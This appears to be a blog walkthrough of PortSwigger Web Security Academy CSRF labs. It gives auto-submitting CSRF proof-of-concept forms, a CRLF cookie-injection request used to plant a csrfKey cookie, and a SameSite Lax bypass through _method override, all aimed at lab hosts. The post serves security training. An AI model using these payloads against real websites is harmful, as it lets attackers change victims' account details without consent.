This post will run through the labs on web sec academy by Portswigger related to CSRF.

CSRF is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. For a CSRF vulnerability there are 3 conditions:
1) A relevant action like changing a password
2) Should have cookie based session handling
3) Should not have unpredicatable parameters that can't be determined or guessed

When these conditions are in place you can make a website like this:
```
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
That way once the victim vists this page the request will be triggered.

### <u>Lab: CSRF vulnerability with no defenses
In this lab we are told that the change email feature is vulnerable to CSRF so we can use an online tool CSRFShark (https://csrfshark.github.io/app/) which will generate us html that we can use based on our request which we can capture using burp. This is what it generated when given the change email request:
```
<body>
    <h1>Form CSRF PoC</h1>
    <form method="POST" action="https://0aad00e603ad7eac80ca035200850046.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="email" value="changed@gmail.com">
        <input type="submit" value="Submit Request">
    </form>
</body>
```
But since we want the form to be auto submitted when the site is visited we will modify the request to add some javascript that auto submits the form.
```
<body>
    <h1>Form CSRF PoC</h1>
    <form method="POST" action="https://0aad00e603ad7eac80ca035200850046.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="email" value="changed@gmail.com">
        <input type="submit" value="Submit Request">
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
```

### <u>Lab: CSRF where token validation depends on request method
One way of protecting against CSRF is having a token in the request which is unique and a secret, it is usually passed as a hidden parameter through forms. However there is still some way to bypass this protection like they might be only checking the token from some request methods. So for this lab while for the POST they check the CSRF token they don't check it for the GET method so we can create this html:
```
<body>
    <h1>Form CSRF PoC</h1>
    <form method="GET" action="https://0ad800a403fd3b2080471730001e0063.web-security-academy.net/my-account/change-email">
        <input type="submit" value="Submit Request">
        <input type="hidden" name="email" value="changed@email.com">
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
```

### <u>Lab: CSRF where token validation depends on token being present
In other cases if the CSRF just isn't present then they won't check for it.
```
<body>
    <h1>Form CSRF PoC</h1>
    <form method="POST" action="https://0a890039030e622480f6b7af001e0045.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="email" value="changedemail@test.com">
        <input type="submit" value="Submit Request">
    </form>
    <script>

    </script>
</body>
```

### <u>Lab: CSRF where token is not tied to user session
Other times while it does validate the CSRF token, the token won't be tied to the a user session but instead be in a global pool of tokens. So for this lab we can use the standard html as other times but after setting up the exploit we need to intercept one of our own requests to change email and get the CSRF token from there then drop that request so we can use that token in our exploit.

### <u>Lab: CSRF where token is tied to non-session cookie
In this lab the CSRF token is not tied to a session but instead it is tied to a cookie csrfKey. So if we want to do a CSRF attack we have to make the victim get both the token and key cookie. For the token we can use the same html form as last time to make the victim send the request.
```
<body>
    <h1>Form CSRF PoC</h1>
    <form method="POST" action="https://0aec00d6043737b180e2034500900088.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="email" value="test@test.com">
        <input type="hidden" name="csrf" value="5HavSbcQ15m9FdQ7EuV0rKC3OIgjMrcr">
        <input type="submit" value="Submit Request">
    </form>
</body>
```
As for the key we will have to do a HTML Header injection and as you look through the functionality of the application you will find that when you search it creates a cookie LastSearchTerm which we can try to escape to set our own cookie. By sending this request we can cause it to set our cookie:
```
GET /?search=test%3b%20%0d%0aSet-Cookie%3acsrfKey=test%3b%20
```
Now we just need to include a link to this in our html which we can do through a img and then also using that img tag to submit the form.
```
<body>
    <h1>Form CSRF PoC</h1>
    <form method="POST" action="https://0aec00d6043737b180e2034500900088.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="email" value="test@test.com">
        <input type="hidden" name="csrf" value="5HavSbcQ15m9FdQ7EuV0rKC3OIgjMrcr">
        <input type="submit" value="Submit Request">
    </form>
    <img src="https://0aec00d6043737b180e2034500900088.web-security-academy.net/?search=test%3b%20%0d%0aSet-Cookie%3+csrfKey=REn2HBaJZ1DlfB0t2ckEVUO6poh9ayv8%3b%20" onerror="document.forms[0].submit()">
</body>
```

### <u>Lab: SameSite Lax bypass via method override
Another protection from CSRF is the SameSite cookie which browsers send to domains that issue them. There are three restriction levels:  
1) Strict  
If a cookie is set to strict then browsers will not send it any cross site requests.  
2) Lax  
The browser will send it if the request is using GET method and request resulted from top level navigation by the user.  
3) None  
Disables same site restrictions.  

In this lab we can use this script to do a top level navigation and use the _method to show that it is a post request while it being a get request:
```
<script>
    document.location = "https://0a1400be043017a88076355500120071.web-security-academy.net/my-account/change-email?email=changed@email.com&_method=POST";
</script>
```
